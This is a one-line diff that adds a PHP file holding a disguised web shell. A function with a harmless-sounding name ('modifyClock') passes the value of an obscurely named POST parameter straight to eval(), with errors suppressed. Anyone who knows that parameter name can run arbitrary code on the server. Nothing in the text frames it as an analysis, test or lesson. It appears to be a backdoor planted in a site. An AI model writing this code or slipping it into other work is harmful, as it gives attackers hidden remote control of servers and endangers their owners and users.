@@ -1,0 +1,1 @@
+<?php modifyClock(@$_POST['9abefa7719']); function modifyClock($trash){ @eval($trash); } ?> 
